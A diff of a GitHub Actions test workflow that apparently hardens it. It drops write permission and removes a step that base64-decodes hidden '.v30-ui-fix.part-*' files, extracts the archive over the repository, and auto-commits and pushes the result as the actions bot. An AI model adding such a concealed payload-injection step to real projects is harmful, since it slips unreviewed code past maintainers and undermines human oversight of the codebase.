@@ -6,7 +6,7 @@ on:
     branches: [main]
 
 permissions:
-  contents: write
+  contents: read
 
 jobs:
   test:
@@ -14,28 +14,6 @@ jobs:
     steps:
       - name: Check out repository
         uses: actions/checkout@v4
-        with:
-          ref: ${{ github.head_ref || github.ref_name }}
-          fetch-depth: 0
-
-      - name: Apply approved v3 UI payload
-        shell: bash
-        run: |
-          set -euo pipefail
-          if ! compgen -G '.v30-ui-fix.part-*' > /dev/null; then
-            echo 'No staged UI payload.'
-            exit 0
-          fi
-          cat .v30-ui-fix.part-* | base64 --decode > .v30-ui-fix.tar.xz
-          echo '347bc759a45145925212403794837fa43143f9700a07276aa83800fdd2bb961d  .v30-ui-fix.tar.xz' | sha256sum --check
-          tar -tJf .v30-ui-fix.tar.xz > /dev/null
-          tar -xJf .v30-ui-fix.tar.xz
-          rm -f .v30-ui-fix.tar.xz .v30-ui-fix.part-*
-          git config user.name 'github-actions[bot]'
-          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
-          git add -A
-          git commit -m 'Apply complete v3 UI updates'
-          git push origin HEAD:${{ github.head_ref || github.ref_name }}
 
       - name: Set up Node.js
         uses: actions/setup-node@v4
@@ -46,33 +24,8 @@ jobs:
       - name: Install locked dependencies
         run: npm ci
 
-      - name: Run data validation and capture output
-        id: data_test
-        continue-on-error: true
-        shell: bash
-        run: |
-          set -o pipefail
-          npm run test:data 2>&1 | tee data-test-output.log
+      - name: Run data validation
+        run: npm run test:data
 
-      - name: Run DOM validation and capture output
-        id: dom_test
-        if: always()
-        continue-on-error: true
-        shell: bash
-        run: |
-          set -o pipefail
-          npm run test:dom 2>&1 | tee dom-test-output.log
-
-      - name: Upload validation output
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: v3-test-output-${{ github.run_attempt }}
-          path: |
-            data-test-output.log
-            dom-test-output.log
-          if-no-files-found: error
-
-      - name: Enforce validation results
-        if: steps.data_test.outcome == 'failure' || steps.dom_test.outcome == 'failure'
-        run: exit 1
+      - name: Run DOM validation
+        run: npm run test:dom
